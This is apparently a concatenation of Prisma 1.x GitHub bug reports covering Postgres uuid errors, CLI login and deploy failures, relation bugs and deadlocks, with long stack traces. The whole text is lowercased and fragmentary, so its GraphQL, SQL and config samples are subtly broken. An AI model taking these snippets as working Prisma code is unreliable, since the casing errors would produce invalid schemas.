prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.executequery(pgpreparedstatement.java:118)
prisma_1 | at com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52)
prisma_1 | at com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java)
prisma_1 | at com.prisma.api.connector.postgresql.database.postgresapidatabasequerybuilder.$anonfun$batchselectfrommodelbyunique$1(postgresapidatabasequerybuilder.scala:159)
prisma_1 | at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)
prisma_1 | at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240)
prisma_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma_1 | at java.lang.thread.run(thread.java:748)
prisma_1 | {"key":"error/unhandled","requestid":"local:api:cjhji0d2v000f07245jw0cxz3","clientid":"default$default","payload":{"exception":"org.postgresql.util.psqlexception: error: operator does not exist: uuid = character varying\ hint: no operator matches the given name and argument type(s)
you might need to add explicit type casts.\ position:
46","query":"{\ users {\ id\ }\ user(where: {id: \\"c3917b5b-18ed-4a84-a6f7-6be7a8c21d66\\"}) {\ id\ }\ }\ ","variables":"{\\"id\\":\\"c3917b5b-18ed-4a84-a6f7-6be7a8c21d66\\"}","code":"0","stack_trace":"org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)\\\ org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)\\\ org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)\\\ org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)\\\ org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)\\\ org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)\\\ org.postgresql.jdbc.pgpreparedstatement.executequery(pgpreparedstatement.java:118)\\\ com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52)\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java)\\\ com.prisma.api.connector.postgresql.database.postgresapidatabasequerybuilder.$anonfun$batchselectfrommodelbyunique$1(postgresapidatabasequerybuilder.scala:159)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)\\\ slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240)\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240)\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\ java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\ java.lang.thread.run(thread.java:748)","message":"error: operator does not exist: uuid = character varying\ hint: no operator matches the given name and argument type(s)
you might need to add explicit type casts.\ position: 46"}}
prisma_1 | [bugsnag - local / testing] error report: com.bugsnag.report@62c16d13
prisma_1 | org.postgresql.util.psqlexception: error: operator does not exist: uuid = character varying
prisma_1 | hint: no operator matches the given name and argument type(s)
you might need to add explicit type casts.
prisma_1 | position: 46
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)
prisma_1 | at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)
prisma_1 | at org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)
prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)
prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.executequery(pgpreparedstatement.java:118)
prisma_1 | at com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52)
prisma_1 | at com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java)
prisma_1 | at com.prisma.api.connector.postgresql.database.postgresapidatabasequerybuilder.$anonfun$batchselectfrommodelbyunique$1(postgresapidatabasequerybuilder.scala:159)
prisma_1 | at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)
prisma_1 | at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240)
prisma_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma_1 | at java.lang.thread.run(thread.java:748)
``` **user table datamodel**
type user @pgtable(name: "user") { id: id! @unique @pgcolumn(name:"userid") displayname: string! email: string! isemailverified: boolean! userid: string!
``` **user table sql**
create table public."user"
( "userid" uuid not null, "displayname" character varying(255) collate pg_catalog."default" not null, "email" character varying(255) collate pg_catalog."default" not null, "isemailverified" boolean not null, constraint "pk_user" primary key ("userid")
with ( oids = false
tablespace pg_default;
* don't be logged in the cli
* don't be logged in the browser
* run `prisma login`
* login using github result: you are now logged in in the browser
terminal still says > opening in the browser and you are not authenticated in the cli.
`prisma deploy` is not generating files
when using database introspection, id fields are allowed to be of type int!
however, when using the generated data-model in prisma and using prisma playground, prisma playground complains with the error: "node.id expects type \\"id!\\" but table.id provides type \\"int!\\"."
when you turn internet connection off and try to deploy you get: ![](
the following query: ```graphql
query givers($organizationid: id!) { persons(where: {transactions_some: {organization: {id: $organizationid}}}) { id transactions(where:{organization:{id:$organizationid}}) { amount } } }
``` ...produces a prisma server error when executed against a postgresql db (running locally in a docker container), specifically for the `transactions` node (its able to query for `persons` okay)
it works when run against a prisma cloud demo service (with mysql)
i'll provide the full error log from the docker container below - it looks to me like there's a suggestion in the error message about what's wrong!
when querying against the root `node` type, the `__typename` of the result is different from the actual type of the node
i'm also unable to query type-specific fields of `node` by creating a fragment for a specific type - i get no results.
my tables in postgres are all using uuid type for their ids
after introspected and deployed to prismagraphql/prisma:1.8 and from the playground run the mutation to create a new record i get the following error: ```
org.postgresql.util.psqlexception: error: column "id" is of type uuid but expression is of type character varying hint: you will need to rewrite or cast the expression
position: 92 at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433) at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178) at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306) at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441) at org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365) at org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155) at org.postgresql.jdbc.pgpreparedstatement.execute(pgpreparedstatement.java:144) at com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44) at com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java) at com.prisma.api.connector.postgresql.database.postgresapidatabasemutationbuilder.$anonfun$createdataitem$1(postgresapidatabasemutationbuilder.scala:50) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69) at slick.dbio.dbioaction$$anon$1.$anonfun$run$1(dbioaction.scala:187) at scala.collection.iterator.foreach(iterator.scala:929) at scala.collection.iterator.foreach$(iterator.scala:929) at scala.collection.abstractiterator.foreach(iterator.scala:1417) at scala.collection.iterablelike.foreach(iterablelike.scala:71) at scala.collection.iterablelike.foreach$(iterablelike.scala:70) at scala.collection.abstractiterable.foreach(iterable.scala:54) at slick.dbio.dbioaction$$anon$1.run(dbioaction.scala:187) at slick.dbio.dbioaction$$anon$1.run(dbioaction.scala:184) at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240) at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
when we use some alias for the fields while querying, we are getting null despite having data for those fields.
type a { id: id! @unique b: string! @unique key: string! @unique
``` ```graphql
mutation a { createa(data: { b: "abc" key: "abc" }) { id }
} mutation b { updatea( where: { b: "abc" } data: { key: null }) { id }
``` results in ```json
"exception": "java.util.nosuchelementexception: bad(invalidvalueforscalartype(none,string)).get",
"stack_trace": "org.scalactic.bad.get(or.scala:1368)\\\ org.scalactic.bad.get(or.scala:1305)\\\ com.prisma.api.mutactions.databasemutactions.updatenodeselectorvalue(databasemutactions.scala:219)\\\ com.prisma.api.mutactions.databasemutactions.$anonfun$getmutactionsforupdate$1(databasemutactions.scala:36)\\\ scala.option.map(option.scala:146)\\\ com.prisma.api.mutactions.databasemutactions.getmutactionsforupdate(databasemutactions.scala:36)\\\ com.prisma.api.mutations.update.$anonfun$preparemutactions$1(update.scala:35)\\\ scala.util.success.$anonfun$map$1(try.scala:251)\\\ scala.util.success.map(try.scala:209)\\\ scala.concurrent.future.$anonfun$map$1(future.scala:287)\\\ scala.concurrent.impl.promise.liftedtree1$1(promise.scala:29)\\\ scala.concurrent.impl.promise.$anonfun$transform$1(promise.scala:29)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ scala.concurrent.impl.executioncontextimpl$adaptedforkjointask.exec(executioncontextimpl.scala:140)\\\ java.util.concurrent.forkjointask.doexec(forkjointask.java:289)\\\ java.util.concurrent.forkjoinpool$workqueue.pollandexecall(forkjoinpool.java:1021)\\\ java.util.concurrent.forkjoinpool$workqueue.execlocaltasks(forkjoinpool.java:1046)\\\ java.util.concurrent.forkjoinpool$workqueue.runtask(forkjoinpool.java:1058)\\\ java.util.concurrent.forkjoinpool.runworker(forkjoinpool.java:1692)\\\ java.util.concurrent.forkjoinworkerthread.run(forkjoinworkerthread.java:157)", ```
running `prisma init` does not genera server files
it only generates the 3 files below.
datamodel.graphql docker-compose.yml prisma.yml
after `prisma init` i run `docker-compose up -d` and then i run `prisma deploy`
i end up getting this error
{ "errors": [ { "message": "project not found: \'graphiql@default\'", "code": 3016, "requestid": "local:api:cjh3r908l000s0834adw100sj" } ]
prisma init only introspects the `public` schema, even though i specified the schema name
the `datamodel.graphql` contains only a `dup` table from the `public` schema
after taking a look at the query log of postgres, i found something interesting:
2018-05-11 04:57:30.570 utc [9155] log: statement: select schema_name from information_schema.schemata where schema_name not like 'pg_%' and schema_name not like 'information_schema';
2018-05-11 04:57:30.599 utc [9155] log: execute <unnamed>: select tc.table_schema, tc.constraint_name, tc.table_name, kcu.column_name, ccu.table_schema as foreign_table_schema, ccu.table_name as foreign_table_name, ccu.column_name as foreign_column_name from information_schema.table_constraints as tc join information_schema.key_column_usage as kcu on tc.constraint_name = kcu.constraint_name join information_schema.constraint_column_usage as ccu on ccu.constraint_name = tc.constraint_name where constraint_type = 'foreign key' and tc.table_schema = $1::text;
2018-05-11 04:57:30.599 utc [9155] detail: parameters: $1 = 'public'
seeding on `prisma deploy` or running `prisma seed` results in this error message: ```json
error: project not found: \'service-name@dev\' { "errors": [ { "message": "project not found: \'service-name@dev\'", "code": 3016, "requestid": "eu1:api:cjh0bxiuf01pn0b14ybipeqbb" } ], "status": 200
when being logged in and running `prisma delete` with a service that is deployed to the demo server, you receive this response: ```json
error: workspace dev does not exist { "data": { "generateclustertoken": null }, "errors": [ { "message": "workspace dev does not exist", "locations": [ { "line": 3, "column": 9 } ], "path": [ "generateclustertoken" ], "code": 222 } ], "status": 200
} get in touch if you need help:
to get more detailed output, run $ set -x debug "*"
a postgres database where tables are named in plural format: 'users', 'subscriptions' and so on, results in a schema where the prisma types are also pluralised
in addition, relations to other tables are double pluralised: a 'users' has many 'subscriptionss'
the database i tried to generate a schema for is one that sits behind a ruby on rails application, where this pluralised naming convention is standard.
prisma export is not auto spliting lists make it impossible to import which is happened on my previous thread ![image]( ![image]( i want to update prisma server so i try to backup my data
i can split list file to smaller manualy to import to the server but the database is scaling up every day, so it kind of anoying.
delete mutations trigger update subscriptions when using variables.
you can deploy this datamodel: ```graphql
type user { id: id! @unique name: string! test: id! @unique test2: id!
} ``` but then, you cannot create a user because `test` and `test2` cannot be set with `createuser` and are also not autogenerated.
on 1.7.x, there are still situations where information from `~/.prisma/config.yml` is required for interactions with prisma servers.
running `prisma deploy` with a `prisma.yml` in pre 1.7.x format that references a cluster that is not in `~/.prisma/config.yml` returns "cluster undefined does not exist" error message
![image 12](
running `prisma deploy -n` with an existing `prisma.yml` file does not convert `service`, `stage` and `cluster` correctly
here is what happens: * line 19 in the screenshot is added
* nothing happens to line 1-3
* no backup file is created ![image 11](
i use `prisma deploy -f` to force prisma to deploy the changes even if there are data changes as described [here]( this produces the exact same amount as if i would have used `prisma deploy` without flags
i have to remove my existing service and re-deploy it.
`prisma playground` will open
running `prisma playground` in a new directory created with `prisma init` opens the playground and returns this error (in electron app): > ".graphqlconfig" file is not available in the provided config directory
server-side subscription throws on mutation execution
running the following resolver results in this internal server error: > (conn=5456) deadlock found when trying to get lock; try restarting transaction ``` "stack_trace": "org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.get(exceptionmapper.java:165)\\\ org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getexception(exceptionmapper.java:106)\\\ org.mariadb.jdbc.mariadbstatement.executeexceptionepilogue(mariadbstatement.java:235)\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:224)\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.execute(mariadbpreparedstatementclient.java:159)\\\ com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)\\\ slick.jdbc.statementinvoker.results(statementinvoker.scala:39)\\\ slick.jdbc.statementinvoker.iteratorto(statementinvoker.scala:22)\\\ slick.jdbc.invoker.first(invoker.scala:31)\\\ slick.jdbc.invoker.first$(invoker.scala:30)\\\ slick.jdbc.statementinvoker.first(statementinvoker.scala:16)\\\ slick.jdbc.streaminginvokeraction$headaction.run(streaminginvokeraction.scala:52)\\\ slick.jdbc.streaminginvokeraction$headaction.run(streaminginvokeraction.scala:51)\\\ slick.dbio.dbioaction$$anon$4.$anonfun$run$3(dbioaction.scala:240)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:240)\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:238)\\\ slick.dbio.dbioaction$$anon$4.$anonfun$run$3(dbioaction.scala:240)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:240)\\\ slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:238)\\\ slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4(dbioaction.scala:534)\\\ slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4$adapted(dbioaction.scala:534)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ slick.dbio.synchronousdatabaseaction$fusedandthenaction.run(dbioaction.scala:534)\\\ slick.dbio.synchronousdatabaseaction$$anon$11.run(dbioaction.scala:571)\\\ slick.dbio.synchronousdatabaseaction$$anon$6.run(dbioaction.scala:470)\\\ slick.dbio.synchronousdatabaseaction$$anon$10.run(dbioaction.scala:562)\\\ slick.dbio.synchronousdatabaseaction$$anon$7.run(dbioaction.scala:487)\\\ slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240)\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240)\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\ java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\ java.lang.thread.run(thread.java:748)",
``` ![screen shot 2018-05-03 at 15 10 33]( if the `deletemanycurrencies` mutation isn't used, and instead the following resolver is executed ![screen shot 2018-05-03 at 15 11 23]( everything works as expected
this has been reproduced with running ~700 `deletemanycurrencies` mutations that each delete ~10 nodes
it seems that `deletemany` mutations haven't been updated in #2177.
when you have a `~/.prisma/config.yml` of this form: ```yml
cloudsessionkey: >- token clusters: local: host: ' clustersecret: 'acnmy-server-secret-123'
``` and you run `prisma init r-2325` you get this error message: ```sh
typeerror: bearer token clusters: local: host: ' clustersecret: 'acnmy-server-secret-123' is not a legal http header value at sanitizevalue (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:741:9) at headers.set (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:857:36) at headers.append (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:869:9) at new headers (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:803:11) at new request (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:1185:19) at /usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:1351:19 at new promise (<anonymous>) at object.fetch (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/node_modules/node-fetch/lib/index.js:1349:9) at object.fetch (/usr/local/lib/node_modules/prisma/node_modules/cross-fetch/dist/node-ponyfill.js:9:20) at environment.<anonymous> (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/src/environment.ts:51:27) at step (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:40:23) at object.next (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:21:53) at /usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:15:71 at new promise (<anonymous>) at __awaiter (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:11:12) at environment.renewtoken (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:93:16) at environment.<anonymous> (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/src/environment.ts:80:12) at step (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:40:23) at object.next (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:21:53) at /usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:15:71 at new promise (<anonymous>) at __awaiter (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:11:12) at environment.getclusters (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:133:16) at environment.<anonymous> (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/src/environment.ts:41:16) at step (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:40:23) at object.next (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:21:53) at fulfilled (/usr/local/lib/node_modules/prisma/node_modules/prisma-yml/dist/environment.js:12:58) at <anonymous>
``` the same happens when running `prisma version`
`prisma/1.7.4 (darwin-x64) node-v9.6.1`
when creating a new project with prisma 1.7.4 globally installed the delete functionality does not work correctly.
![image 9](
when running command `prisma delete`:
error: no cluster could be found for workspace \'prod\' and cluster \'justmighty\' { "data": { "generateclustertoken": null }, "errors": [ { "message": "no cluster could be found for workspace \'prod\' and cluster \'justmighty\'", "locations": [ { "line": 3, "column": 9 } ], "path": [ "generateclustertoken" ], "code": 222 } ], "status": 200
workspace is `prod` insted of `justmighty`
`prisma/1.7.3 (darwin-x64) node-v9.2.0`
my docker is running on a different network interface and getting a different ip address
prisma checks if the specified endpoint includes _localhost_ or _127.0.0.1_ and considers that as a local which is not correct in my case
#l24 if the endpoint is not recognized as local, it will fallback to _cluster_ name "default"
this creates a collision in case there is another custom cluster
the host for running prisma commands (eg
deploy, token) is then taken from `config.yml` (default cluster) which turns out to be wrong if running against this custom cluster.
when executing the `prisma delete` command, while not being logged in to prisma cloud, the cli opens a browser window to login to cloud
this is for a deployment to the prisma eu sandbox env.
that behaviour is espescially problematic in a ci env
this is on prisma 1.7.3 versions
also checked on primsa 1.8.0, problem still exists.
`docker-compose up`
psequel works as expected
`prisma deploy` (`prisma@1.7.2`)
i am still able to connect to the db, but after navigating to my schema and selecting a table, psequel errors with "could not send query(connection dead)"
i am still able to connect and make sql queries from `psql`
this is a copy of issue #1734 .
it is marked as closed, however i am still able to reproduce the error following the [howtographql tutorial](
when deploying prisma-cli shows nothing changed instead of invalid token
i discovered it with `graphql -p database diff` and there i got invalid token.
i can add projects, remove and deploy to my prisma server without a token.
prisma app server not running on set port
"prisma-binding": "^1.5.17",
"prisma": "^1.6.3",
prisma db throws an error when attempting to stringify json fields.
it is impossible to mutate to `null` or to query by `null` values in typescript.
the generated `prisma.ts` uses non-primitive boxed types for `string`, `boolean` and `number` which makes `tslint` complain when the `ban-types` rule is enabled.
`prisma info --json` returns this information: ```
{ "name": "n-279", "stage": "n-279", "cluster": "prisma-eu1", "workspace": "nilan-marktanner-7ea852", "httpendpoint": " ", "wsendpoint": "wss://eu1.prisma.sh/nilan-marktanner-7ea852/n-279/n-279"
``` the stage should be `dev` instead: ```diff
{ "name": "n-279",
- "stage": "n-279",
+ "stage": "dev", "cluster": "prisma-eu1", "workspace": "nilan-marktanner-7ea852",
- "httpendpoint": " ",
- "wsendpoint": "wss://eu1.prisma.sh/nilan-marktanner-7ea852/n-279/n-279"
+ "httpendpoint": " ",
+ "wsendpoint": "wss://eu1.prisma.sh/nilan-marktanner-7ea852/n-279/dev"
``` you can verify this with these endpoints:
when relating a user-user relation, the back-relation does not connect as expected
as a result, disconnecting is impossible
### relevant datamodel
```javascript
type user { id: id! @unique followers: [user!]! @relation(name: "useronuser") following: [user!]! @relation(name: "useronuser") ...
``` ### follow mutation
```javascript
async follow(parent, { followeruserid, recipientuserid }, ctx: context, info) { return await ctx.db.mutation.updateuser( { where: { id: recipientuserid }, data: { followers: { connect: { id: followeruserid } } }, }, info ) },
``` based on the above model and mutation
the current behaviour is that the `follow()` mutation below produces the output below
#### mutation
```javascript
mutation { follow( followeruserid: "cjg3wzfu3000r01819ml1mxid" recipientuserid: "cjg3yiwkk004101813sgg9h16" ) { id followers{ name } following{ name } }
``` #### result
```javascript
{ "data": { "follow": { "id": "cjg3yiwkk004101813sgg9h16", "followers": [ { "name": "sarah conner" } ], // following should be empty "following": [ { "name": "sarah conner" } ] } }
``` looking at the user object for both users we see the following output
where sarah is listed under both `followers` and `following` for ned
meanwhile, ned does not have any relations under either `followers` or `following`
#### user query
```javascript
{ "data": { "users": [ { "id": "cjg3wzfu3000r01819ml1mxid", "firstname": "sarah", "lastname": "conner", "followers": [], // following should contain a relation to ned "following": [] }, { "id": "cjg3yiwkk004101813sgg9h16", "firstname": "ned", "lastname": "johnson", "followers": [ { "id": "cjg3wzfu3000r01819ml1mxid", "name": "sarah conner" } ], // following should be empty "following": [ { "id": "cjg3wzfu3000r01819ml1mxid", "name": "sarah conner" } ] } ] }
``` ### reproduction
#### specifications
"dependencies": { "algoliasearch": "^3.24.11", "bcryptjs": "2.4.3", "bugsnag": "^2.3.1", "graphql-subscriptions": "0.5.6", "graphql-yoga": "^1.2.4", "guid": "^0.0.12", "jsonwebtoken": "8.1.1", "prisma-binding": "^1.5.7", "querystring": "^0.2.0", "request": "^2.83.0" }, "devdependencies": { "@types/bcryptjs": "2.4.1", "@types/jest": "^22.2.0", "@types/jsonwebtoken": "^7.2.6", "dotenv-cli": "1.4.0", "eslint": "^4.18.1", "graphql-cli": "^2.13.2", "graphql-playground": "^1.3.17", "jest": "^22.4.2", "nodemon": "1.14.12", "npm-run-all": "4.1.2", "prisma": "^1.1.3", "rimraf": "2.6.2", "ts-jest": "^22.4.2", "ts-node": "4.1.0", "tslint-config-airbnb": "^5.7.0", "typescript": "^2.6.2" }, "resolutions": { "graphql": "^0.12.3" },
``` ### expected behavior
i would expect the follow mutation to produce the following, where only the `followers` field has been connected on ned's user object:
```javascript
{ "data": { "follow": { "id": "cjg3yiwkk004101813sgg9h16", "followers": [ { "name": "sarah conner" } ], //following should be empty "following": [] } }
``` i would expect the user query after the follow mutation to produce the following, where `followers` is updated on ned's user object, and `following` is updated on sarah's user object:
```javascript
{ "data": { "users": [ { "id": "cjg3wzfu3000r01819ml1mxid", "firstname": "sarah", "lastname": "conner", "followers": [], // following should contain this relation "following": [ { "id": "cjg3wzfu3000r01819ml1mxid", "name": "sarah conner" } ] }, { "id": "cjg3yiwkk004101813sgg9h16", "firstname": "ned", "lastname": "johnson", "followers": [ { "id": "cjg3wzfu3000r01819ml1mxid", "name": "sarah conner" } ], // following should be empty "following": [] } ] }
if you delete the generated files (`prisma.graphql` and `prisma.ts` under `src`) `prisma` will fail to operate as expected.
my english is quite bad, so i don't know if i describe it good enough to understand
database schema
type post { id: id! @unique title: string! related: [post!]! @relation(name: "relatedposts")
``` connect 3 record will duplicate relation, and you cannot disconnect all relation by updating one of them
a connect b & c, we will get a + b & c b connect c & a, we will get b + c & a & a (i use the same query to connect relation on the front-end so it's duplicated the record a which is already connected) if we just connect b to c everything is work normally
but when we connect the record already connected with an another, it will cause problems
**now disconnect** as the above result we have b + c & a & a update b disconnect a, we will get b+ c & a update b disconnect a again, we will get error eventhough the relation is still exist
and we cannot disconnect relation by update a for all record
we have to try to update every single item from a b c to disconnect all the record.
json is not correctly validated.
if we connect many to many self relation from a to b, we will get a related to b, but b is not related to a.
if i start deploy in watch mode and **there are no** changes in my schema, watch mode does not update database schema.
if i start deploy in watch mode and on start **there are** changes in my schema it works as expected.
if my changes of `datamodel.graphql` has no updates for the schema (just <kbd>cmd + s</kbd> in editor or `touch` file) watch mode stops work even i will change the schema after that.
the import is finish, but all relation field is missing data
![image]( ![image](
server side subscriptions are not triggered.
`prisma playground --web` opens electron app.
old datasetaexport
new datasetbexport `.import` folder can be left behind when importing different exports
setting a field of type `[json!]!` results in an internal server error.
running a specific `deletemanyxs` mutation with deep filters results in an internal server error.
it appears to be the case that "anonymous" sessions in the cli are expiring after some while (30 days?)
this leads to the following scenario (all while not being logged in in the cli): * deploy a project to the development cluster
* time goes by and the session expires
* try to deploy again => you'll receive this error: > error: authentication token is invalid: token can't be decoded: the token is expired since 2018-03-22t07:18:34z
deleting a service from the development cluster is not possible: ```
deleting service import-id-missing@dev ! error: not authorized
please provide a proper \'authorization\' header { "data": null, "errors": [ { "message": "not authorized
please provide a proper \'authorization\' header", "locations": [ { "line": 2, "column": 11 } ], "path": [ "deleteservice" ] } ], "status": 200
running `prisma playground` opens wrong endpoint.
when you are trying to deploy three or more relations between the same two types, you receive an internal server error: ```
prisma-database_1 | java.lang.illegalargumentexception: requirement failed: this method must only be called for unambiguous relations!
prisma-database_1 | at scala.predef$.require(predef.scala:277)
prisma-database_1 | at com.prisma.shared.models.schema.getunambiguousrelationthatconnectsmodels_$bang(models.scala:114)
prisma-database_1 | {"key":"error/unhandled","requestid":"cluster:cluster:cjezvk0nk00190135wc9abixm","payload":{"exception":"java.lang.illegalargumentexception
: requirement failed: this method must only be called for unambiguous relations!","query":" mutation($name: string!, $stage: string! $types: string! $dryru
n: boolean $secrets: [string!], $subscriptions: [functioninput!]) {\ deploy(input: {\ name: $name\ stage: $stage\ types: $
types\ dryrun: $dryrun\ secrets: $secrets\ subscriptions: $subscriptions\ }) {\ errors {\ type\ field\ description\ }\ migration {\ ...migrationfragment\ }\ }\ }\ \ fragment
migrationfragment on migration {\ revision\ steps {\ type\ __typename\ ..
on createenum {\ name\ ce_values: values\ }\ ...
on createfield {\ model\ name\ cf_typename: typename\ cf_isrequired: isrequired\ cf_islist: islist\ cf_isunique: unique\ cf_relation: relation\ cf_defaultvalue: default\ cf_enum: enum\ }\ ..
on createmodel {\ name\ }\ ..
on createrelation {\ name\ leftmodel\ rightmodel\ }\ ..
on deleteenum {\ name\ }\ ..
on deletefield {\ model\ name\ }\
on deletemodel {\ name\ }\ ..
on deleterelation {\ name\ }\ ..
on updateenum {\ name\ newname\ values\ }
on updatefield {\ model\ name\ newname\ typename\ isrequired\ islist\ isunique: unique\ relation\ default\ enum\ }\ ..
on updatemodel {\ name\ um_newname: newname\ }\ }\ }\ \ ","variables":"{\\"stage\\":\\"dev\\",\\"name\\":\\
